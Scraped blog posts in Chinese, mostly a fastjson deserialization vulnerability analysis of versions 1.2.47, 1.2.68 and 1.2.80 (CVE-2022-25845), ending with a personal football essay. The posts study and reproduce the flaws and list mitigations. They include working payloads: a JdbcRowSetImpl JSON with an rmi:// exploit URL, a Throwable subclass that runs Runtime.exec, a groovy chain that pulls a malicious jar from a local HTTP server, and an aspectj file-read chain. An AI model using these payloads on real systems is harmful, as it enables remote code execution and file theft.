- 1)) * PRIME == 0x9198507b5af98f0L) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; // autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项 if (autoTypeSupport || expectClass != null) { long hash = h3; for (int i = 3; i \u0026lt; className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u0026gt;= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) { return clazz; } } // 在对比 denyHashCodes 进行黑名单匹配 // 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类 // 则抛出异常 if (Arrays.binarySearch(denyHashCodes, hash) \u0026gt;= 0 \u0026amp;\u0026amp; TypeUtils.getClassFromMapping(typeName) == null) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } } } // 尝试在 TypeUtils.mappings 中查找缓存的 class if (clazz == null) { clazz = TypeUtils.getClassFromMapping(typeName); } // 尝试在 deserializers 中查找这个类 if (clazz == null) { clazz = deserializers.findClass(typeName); } // 如果找到了对应的 class，则会进行 return if (clazz != null) { if (expectClass != null \u0026amp;\u0026amp; clazz != java.util.HashMap.class \u0026amp;\u0026amp; !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } return clazz; } // 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致 if (!autoTypeSupport) { long hash = h3; for (int i = 3; i \u0026lt; className.length(); ++i) { char c = className.charAt(i); hash ^= c; hash *= PRIME; if (Arrays.binarySearch(denyHashCodes, hash) \u0026gt;= 0) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } if (Arrays.binarySearch(acceptHashCodes, hash) \u0026gt;= 0) { if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if (expectClass != null \u0026amp;\u0026amp; expectClass.isAssignableFrom(clazz)) { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } return clazz; } } } // 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类 if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if (clazz != null) { if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) { return clazz; } if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver ) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } if (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { return clazz; } else { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } } JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); if (beanInfo.creatorConstructor != null \u0026amp;\u0026amp; autoTypeSupport) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } } final int mask = Feature.SupportAutoType.mask; boolean autoTypeSupport = this.autoTypeSupport || (features \u0026amp; mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE \u0026amp; mask) != 0; if (!autoTypeSupport) { throw new JSONException(\u0026#34;autoType is not support. \u0026#34; + typeName); } return clazz; } 由以上代码可知，这里存在一个逻辑问题：autoTypeSupport 为 true 时，fastjson 会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。这里就留下了一个伏笔。就是这个逻辑导致了 1.2.32 之前的版本将会受到 autoTypeSupport 的影响。\n在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以我们的关注点就在判断之前，程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。如何才能在这两步中将我们的恶意类加载进去呢？\n先看 deserializers ，位于 com.alibaba.fastjson.parser.ParserConfig.deserializers ，是一个 IdentityHashMap，能向其中赋值的函数有：\ngetDeserializer()：这个类用来加载一些特定类，以及有 JSONType 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。 initDeserializers()：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。 putDeserializer()：被前两个函数调用，我们无法控制入参。 因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 TypeUtils.getClassFromMapping(typeName)。\n同样的，这个方法从 TypeUtils.mappings 中取值，这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：\naddBaseClassMappings()：无入参，加载 loadClass()：关键函数 接下来看一下 loadClass() 的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 public static Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader, boolean cache) { // 非空判断 if(className == null || className.length() == 0){ return null; } // 防止重复添加 Class\u0026lt;?\u0026gt; clazz = mappings.get(className); if(clazz != null){ return clazz; } // 判断 className 是否以 [ 开头 if(className.charAt(0) == \u0026#39;[\u0026#39;){ Class\u0026lt;?\u0026gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } // 判断 className 是否 L 开头 ; 结尾 if(className.startsWith(\u0026#34;L\u0026#34;) \u0026amp;\u0026amp; className.endsWith(\u0026#34;;\u0026#34;)){ String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } try{ // 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中 if(classLoader != null){ clazz = classLoader.loadClass(className); if (cache) { mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ e.printStackTrace(); // skip } // 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中 try{ ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null \u0026amp;\u0026amp; contextClassLoader != classLoader){ clazz = contextClassLoader.loadClass(className); if (cache) { mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ // skip } // 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中 try{ clazz = Class.forName(className); mappings.put(className, clazz); return clazz; } catch(Throwable e){ // skip } return clazz; } 由以上代码可知，只要我们能够控制这个方法的参数，就可以往 mappings 中写入任意类名。 loadClass 一共有三个重载方法，如下图：\n我们需要找到调用这些方法的类，并看是否能够为我们控制：\nClass\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader, boolean cache)：调用链均在 checkAutoType() 和 TypeUtils 里自调用，略过。 Class\u0026lt;?\u0026gt; loadClass(String className)：除了自调用，有一个 castToJavaBean() 方法，暂未研究。 Class\u0026lt;?\u0026gt; loadClass(String className, ClassLoader classLoader)：方法调用三个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中。 重点看一下两个参数的 loadClass 方法在哪调用：\n在这里我们关注 com.alibaba.fastjson.serializer.MiscCodec#deserialze 方法，这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 Class.class 类，成为了我们的入口。\n如果 parser.resolveStatus 为TypeNameRedirect（值为2） 时，进入 if 语句，会解析 val 中的内容并放入 objVal 中，然后传入 strVal 中。\n后面的逻辑如果 class 是 Class.class 时，将会调用 loadClass 方法，将 strVal 进行类加载并缓存：\n小结 首先要避开checkAutoType()中autoTypeSupport 默认为 false 时的检查，从两个if判断语句入手 发现只有TypeUtils.getClassFromMapping(typeName)可能对clazz赋值 使用两个参数的loadclass向mapping中赋值 MiscCodec#deserialze 方法调用了两个参数的loadclass 调用之前需要满足parser.resolveStatus 为TypeNameRedirect（值为2） 时，其中一个key为 val ，此时会将val的内容放入 objVal 中，然后传入 strVal 中。 接着如果 class 是 Class.class 时，将会调用 loadClass 方法，将 strVal 进行类加载并缓存\n所以可以将恶意类名存到val中，这就完成了恶意类的加载，可以避开异常的抛出。 如何满足parser.resolveStatus 为TypeNameRedirect（值为2），在后面调试中会讲到\n调试 我们先构造一个 json ：{\u0026quot;@type\u0026quot;:\u0026quot;java.lang.Class\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;reus09\u0026quot;} ，调试一下：\nJSON.parseObject() 调用 DefaultJSONParser 对 JSON 进行解析。\nDefaultJSONParser.parseObject()调用checkAutoType()` 检查待加载类的合法性。\n由于 deserializers 在初始化时将 Class.class 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。\nDefaultJSONParser.parseObject() 设置 resolveStatus 为 2。 DefaultJSONParser.parseObject() 根据不同的 class 类型分配 deserialzer，Class 类型由 MiscCodec.deserialze() 处理。\n解析 json 中 “val” 中的内容，并放入 objVal 中，如果不是 \u0026ldquo;val\u0026rdquo; 将会报错。\n传递至 strVal 并使用 loadClass 加载并缓存。\n此时恶意的 val 成功被我们加载到 mappings 中，再次以恶意类进行 @type 请求时即可绕过黑名单进行的阻拦，因此最终 payload 为：\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;reus09\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;reus09\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;rmi://127.0.0.1:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } } fastjson-1.2.68 在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 MiscCodec 处理 Class 类的地方，设置了cache 为 false ，并且 loadClass 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。\n这个安全修复为 fastjson 带来了一定时间的平静，直到 1.2.68 版本出现了新的漏洞利用方式。\n影响版本：fastjson \u0026lt;= 1.2.68 描述：利用 expectClass 绕过 checkAutoType() ，实际上也是为了绕过安全检查的思路的延伸。主要使用 Throwable 和 AutoCloseable 进行绕过。\n版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 checkAutoType() 中直接抛出异常，也就是完全禁止 autoType，不得不说，这是一个一劳永逸的修复方式。\n但与此同时，这个版本报出了一个新的 autoType 开关绕过方式：利用 expectClass 绕过 checkAutoType()。\n在 checkAutoType() 函数中有这样的逻辑：如果函数有 expectClass 入参，且我们传入的类名是 expectClass 的子类或实现，并且不在黑名单中，就可以通过 checkAutoType() 的安全检测。(isAssignableFrom(clazz) 判定此 Class 对象所表示的类或接口与指定的 Class 参数所表示的类或接口是否相同，或是否是其超类或超接口)。\n接下来我们找一下 checkAutoType() 几个重载方法是否有可控的 expectClass 的入参方式，最终找到了以下几个类：\nThrowableDeserializer#deserialze() JavaBeanDeserializer#deserialze() ThrowableDeserializer#deserialze() 方法直接将 @type 后的类传入 checkAutoType() ，并且 expectClass 为 Throwable.class。\n通过 checkAutoType() 之后，将使用 createException 来创建异常类的实例。\n这就形成了 Throwable 子类绕过 checkAutoType() 的方式。我们需要找到 Throwable 的子类，这个类的 getter/setter/static block/constructor 中含有具有威胁的代码逻辑。\n与 Throwable 类似地，还有 AutoCloseable ，之所以使用 AutoCloseable 以及其子类可以绕过 checkAutoType() ，是因为 AutoCloseable 是属于 fastjson 内置的白名单中，其余的调用链一致，流程不再赘述。\nfastjson-1.2.80 见之前文章。\n总结 经过上面的分析，我们直到如果想要通过checkAutoType的检验，有以下几种方法:\n传入的类在白名单中 开启了autotype(autoTypeSupport is true) 使用了JSONType注解(如:fastjson.annotation.JSONType) 某些期望类 (继承于expectClass) 要反序列化的类在cache中 (TypeUtils.mappings列表中有 @type 指定的类) 但具体可以操作的路线、攻击链感觉还是要对代码有足够的熟练掌握。\n总的来说，感觉fastjson漏洞的利用大部分都是一些逻辑上的代码问题，同时也是黑客巧妙的攻击链构造。\n最后，学习到了一些FastJson反序列化的基本原理，之前都是云里雾里，不知其所以然。此外，对FastJson的parse、parseObject相关方法的区别。还有就是发现现在写博客往往都是对别人的文章大抄特抄，自己的东西、思考太少了，为什么要这样写?为什么这么思考?以后还是需要努力。\nReference https://su18.org/post/fastjson/#1-fastjson-1224 http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/ https://www.yang99.top/index.php/archives/71/ https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl https://juejin.cn/post/6846687594130964488#heading-3 https://blog.csdn.net/hosaos/article/details/106982555 ","permalink":"http://www.reus09.top/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","summary":"实际上，前不久刚刚分析了FastJson1.2.80漏洞，一方面对Java反序列化漏洞有了一个初步的了解，如果可以控制一个类的实例化，并且这","title":"FastJson反序列化漏洞总结"},{"content":"实际上保研后、十一假期之后，一直在摆烂、躺平(充分感受到研究生打工仔的命运)，这篇文章主要是想分析一下FastJson最新爆出来的漏洞CVE-2022-25845，学到了AutoTypeCheck是如何作用的。实际上好多大师傅已经分析的很明白了，我也只是借着大师傅的笔记手动复现一下，之后会对FastJson系列漏洞做一个系统的整理。\n0x01 漏洞介绍 Fastjson 代码执行漏洞，该漏洞允许攻击者绕过 Fastjson 中的\u0026quot;AutoTypeCheck\u0026quot;机制并实现远程代码执行\n影响版本：1.2.80及以下版本，即\u0026lt;= 1.2.80\n所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 JSON.parse 或 JSON.parseObject 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。\n在这些前提条件下，攻击者也只能通过这个漏洞调用特定类型的Java反序列化gadget（继承Throwable类的gadget类），这大大限制了这个漏洞的实际影响。\n期望类与类缓存 Fastjson反序列化恢复类实例时，自然也需要恢复用到了的类属性。如果这个属性是可利用的类且我们可控，是不是就能直接利用 或者进一步横向扩展出其它类间接利用。上一篇我们说到了期望类不但可以由JSON显式指定，同样可以由类间关系隐式确定，那么依靠属性名赋值时的隐式类间关系，也就不再需要在JSON中显式指定@type，从而绕过了autoType的白名单检查。\n实例化类属性的对应类后，fastjson会将其加入到类缓存mappings中，从缓存中取类在修复前不会判断autoTypeSupport，所以绕过了类白名单机制扩展出更多的可用类。\n0x02 漏洞环境搭建 环境依赖导入：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.41\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.42\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.43\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.44\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.47\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;1.2.68\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;version\u0026gt;1.2.80\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 文件读取包 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.aspectj\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;aspectjtools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- groovy-all 利用链 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.codehaus.groovy\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;groovy-all\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.12\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;/dependency\u0026gt; YoungBear提供的方案 YoungBear提供的漏洞POC代码如下：\npoc类：必须继承Exception类或者Error\n1 2 3 4 5 6 7 8 9 10 11 import java.io.IOException; public class PocThrow extends Exception{ public void setName(String str) { try { Runtime.getRuntime().exec(str); } catch (IOException e) { e.printStackTrace(); } } } 攻击代码:\n1 2 3 4 5 public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Exception\\\u0026#34;,\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;PocThrow\\\u0026#34;,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;open /System/Applications/Calculator.app\\\u0026#34;}\u0026#34;; JSON.parse(json); } 主要通过构造json串，实现绕过Auto-type\n1 2 3 4 5 { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Exception\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;PocThrow\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;calc\u0026#34; } groovy链 浅蓝师傅给出的攻击链：\n攻击利用需要用到classpathList需要先搭建一个恶意的攻击服务器，里面存在我们的恶意jar包\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package groovy.grape; import org.codehaus.groovy.ast.ASTNode; import org.codehaus.groovy.control.CompilePhase; import org.codehaus.groovy.control.SourceUnit; import org.codehaus.groovy.transform.ASTTransformation; import org.codehaus.groovy.transform.GroovyASTTransformation; import java.io.IOException; @GroovyASTTransformation(phase= CompilePhase.CONVERSION) public class GrabAnnotationTransformation2 implements ASTTransformation { public GrabAnnotationTransformation2() { try { Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;); } catch (IOException e) { } } @Override public void visit(ASTNode[] nodes, SourceUnit source) { } } 然后RCE利用poc代码,实现弹计算器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import com.alibaba.fastjson.JSON; import java.io.IOException; /** * @ClassName groovy * @Description TODO * @Author reus09 * @Date 2022/10/8 16:50 * @Version 1.0 **/ public class groovy { private static String poc1 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Exception\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.codehaus.groovy.control.CompilationFailedException\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;unit\\\u0026#34;:{}\\n\u0026#34; + \u0026#34;}\u0026#34;; private static String poc2 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.codehaus.groovy.control.ProcessingUnit\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;config\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.codehaus.groovy.control.CompilerConfiguration\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;classpathList\\\u0026#34;:\\\u0026#34;http://127.0.0.1:8000/attack-1.jar\\\u0026#34;\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34;}\u0026#34;; public static void main(String[] args) throws IOException { try { JSON.parseObject(poc1); } catch (Exception e){} JSON.parseObject(poc2); } } aspectj读取文件 读取文件利用代码\n读取/Users/reus09/flag.txt文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import com.alibaba.fastjson.JSON; public class aspectj { private static String poc1 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Exception\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\\\u0026#34;\\n\u0026#34; + \u0026#34;}\u0026#34;; private static String poc2 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;val\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.String\\\u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.util.Locale\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;val\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.alibaba.fastjson.JSONObject\\\u0026#34;,{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.String\\\u0026#34;\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;newAnnotationProcessorUnits\\\u0026#34;:[{}]\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34; }\u0026#34;; private static String poc3 = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;x\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;fileName\\\u0026#34;:\\\u0026#34;/Users/reus09/flag.txt\\\u0026#34;\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34;}\u0026#34;; public static void main(String[] args) { JSON.parseObject(poc1); try { JSON.parseObject(poc2); } catch (Exception e){} System.out.println(JSON.parseObject(poc3)); } } 0x03 漏洞复现 基础POC 可以实现直接弹计算器\ngroovy链利用 将我们需要远程加入classpathList的恶意代码打包为jar包，然后使用python在当前目录开启一个简易的http服务器:\npython -m http.server 8000:\n然后运行groovy的利用代码\naspectj链利用 在/Users/reus09/目录下写文件flag.txt\n运行poc获取目标文件的内容\n0x04 漏洞原理分析 fastjson 1.2.25 后设定了 autoType 。只有打开 autoType之后，fastjson 是基于内置黑名单来实现安全的，如此可能会造成安全风险，就是绕过黑名单。关闭时，是基于白名单进行防护的，这个漏洞的产生就是未开启 autoType 时产生的。\n但是关闭 autoType 时是基于白名单，是很难实现代码执行的，所以我们就需要想办法 Bypass AutoType 默认禁用策略，可以实现调用任意类。\n当JSON.parseObject()被调用时，它最终会调用到 DefaultJSONParser.parseObject()，并且传入参数object 为 JSONObject，fieldName 为 null。当这个方法遇到“@type”这个符号（JSON.DEFAULT_TYPE_KEY）时，就会调用config.checkAutoType：\n代码会调用至config.checkAutoType()。在这里，我们可以看到因为被列入黑名单而无法通过AutoType 机制实例化的类列表。\n这些被Ban的类是以下这些：\njava.lang.Object java.io.Serializable java.lang.Cloneable java.lang.Runnable java.lang.AutoCloseable java.io.Closeable java.lang.Iterable java.util.Collection java.lang.Readable java.util.EventListener 也可以在 fastjson-blacklist 查看到更多被列入黑名单的类。这个仓库维护了被列入Fastjson黑名单的类的hash值。\n然后，代码将尝试找到一个反序列化器deserializer，用来对这个已经被JSON序列化的类进行反序列化。\n进入com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class\u0026lt;?\u0026gt;, java.lang.reflect.Type)查看具体的流程，在内部有一个关键检查，检查目标类是否继承了Throwable类\n接着，进入ThrowableDeserializer.deserialize()继续分析，如果存在“@type”，它将使用 checkAutoType检查并继续正常反序列化：\n所以我们只要目标类继承了Throwable，Fastjson便可以反序列化为任意类！\n在ThrowableDeserializer#deserialze通过createException函数进行创建反序列化类，处理了 3 种不同类型的构造函数。一个没有任何参数，一个带有异常消息的参数，一个带有异常消息和异常原因参数。在此之后，它将先尝试调用更为复杂的构造函数（causeConstructor、messageConstructor 和 defaultConstructor）：\n在ThrowableDeserializer最后，作为类实例化的一步，还会为每个相关成员变量调用一个 setter方法： 在最后的setValue反序列化中实现命令执行。\nGroovy链原理 指定显式期望类，实例化XXXException并被加入类缓存 通过XXXException中可控的属性名/参数名，由隐式类间关系实例化并被加入类缓存 直接从缓存中拿出来用，或者进一步递归让其它类被加入到缓存 这里因为Throwable类可以用来绕过AutoType\n0x05 缓解措施 升级到最新版本1.2.83 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 开启safeMode 通过代码配置 ParserConfig.getGlobalInstance().setSafeMode(true); 通过JVM启动参数配置 -Dfastjson.parser.safeMode=true 通过Fastjson的配置文件配置项 fastjson.parser.safeMode=true 升级到fastjson v2 0x06 总结 事实上这是学习的第一个FastJson漏洞，通过分析感觉对FastJson的AutoType机制和JSON反序列化漏洞的一些原理，Java对get、set、constructor等可以加入恶意代码从而实现命令执行。实际上，这几天学习脑袋晕乎乎的，输球、项目啥的一大堆烦心事，之后会对进行进一步的整理。\n0x07 参考 https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/ https://alter1125.github.io/2022/07/29/CVE-2022-25845%20FastJson%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://hosch3n.github.io/2022/03/24/Fastjson-autoType%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%88%A9%E7%94%A8%E6%9C%9F%E6%9C%9B%E7%B1%BB https://github.com/YoungBear/FastjsonPoc ","permalink":"http://www.reus09.top/posts/tech/cve-2022-25845-fastjson-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","summary":"实际上保研后、十一假期之后，一直在摆烂、躺平(充分感受到研究生打工仔的命运)，这篇文章主要是想分析一下FastJson最新爆出来的漏洞CVE","title":"CVE-2022-25845 FastJson RCE漏洞分析"},{"content":"虽说有感，但其实多特与拜仁的国家德比也完完全全的映射在我的足球记忆，充斥在我的大学生活中。 我的足球萌芽起源于2018年俄罗斯世界杯，很晚才接触到足球，算上如今大学三年，接触足球也不过寥寥四年罢了，从一个不会踢、满脑子想着花式过人的运动废材到现在自认为愈发不会踢的庸人。对多特的印象最开始是源自马尔科-罗伊斯，小火箭在世界杯上面的惊鸿一瞥，让我认识到了这个天妒英才的球员，然后对多特蒙德的印象就是2018年德国国家德比多特蒙德三比二逆转拜仁慕尼黑，奔着当时高中小伙伴都喜欢选一个主队的氛围，我选择青春风暴大黄蜂作为主队。\n四年来，多特蒙德的教练走马观花，从法夫尔、泰尔齐奇、罗泽，虽然就我个人来说，都是相对平庸的教练，但是今天泰尔齐奇率队的多特蒙德却让我难得的看到了一个强队该有的血性、顽强。这些年，自2019年德国超级杯以来，拜仁对阵多特已经八连胜，而且大部分都是大比分血洗，四比零、五比零！国家德比已经很少看了，反正也是大比分输罢了。\n今天凌晨的国家德比说句实话我只看了60分钟，但是上半场多特蒙德的防守真的做的非常棒，球员的态度非常的积极。但是随着格雷茨卡、萨内的两记世界波，零比二落后，事实上，鉴于多特蒙德长久以来不会踢逆风球、球员心态容易出问题、自己已有些瞌睡，便沉沉睡去，也许心里还有幻想也行能赢、能逆转、也行呢。\n早晨起床，打开手机，看到读秒绝平、看到解说喜极而泣的怒吼、宣泄，这三年来，多特蒙德的八连败终结了，新星穆科科扳回一球，被我一直诟病的”权健名宿“莫德斯特读秒头球绝平，这是全队的努力、拼抢换来的，确实令人感动。\n实际上，在生活中，随着三年大学生涯的过去，映射的我的生活，平平无奇、默默无闻、泯然众人，我可以清晰的发现我的文字表达欲在下降，社交表达欲望在下降，正如读我这篇乱七八糟、七零八碎的文章。大学三年的学习，换来一个保研的资格，但是研究生的生活却跟想象的不太一样，三年生活中，想学很多东西，却都是半途而废，自以为技术很厉害，却是脚本小子，井底之蛙。\n希望，明天会更好，希望，自己会更强，希望，自己能成为一个更完整的人。\n","permalink":"http://www.reus09.top/posts/life/%E8%A7%822022%E5%B9%B410%E6%9C%889%E6%97%A5%E5%A8%81%E6%96%AF%E7%89%B9%E6%B3%95%E4